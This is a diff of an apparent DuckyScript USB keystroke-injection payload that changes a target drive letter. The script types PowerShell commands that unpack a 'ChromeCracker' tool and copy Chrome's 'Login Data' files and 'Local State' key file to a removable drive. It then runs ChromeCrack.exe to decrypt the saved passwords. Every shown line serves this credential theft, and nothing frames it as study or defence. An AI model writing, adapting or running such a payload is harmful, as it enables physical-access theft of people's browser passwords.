@@ -30,16 +30,16 @@ DELAY 800
 STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath C:\Users\$env:UserName\ChromeCracker -Force
 ENTER
 DELAY 800
-STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "d:\" -Force
+STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "x:\" -Force
 ENTER
 DELAY 800
-STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "d:\$env:UserName\"
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "x:\$env:UserName\"
 ENTER
 DELAY 800
-STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Destination "d:\$env:UserName\"
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Destination "x:\$env:UserName\"
 ENTER
 DELAY 800
-STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "d:\$env:UserName\"
+STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State" -Destination "x:\$env:UserName\"
 ENTER
 DELAY 800
 STRING cd C:\Users\$env:UserName\ChromeCracker\ChromeCrack\; .\ChromeCrack.exe $env:UserName
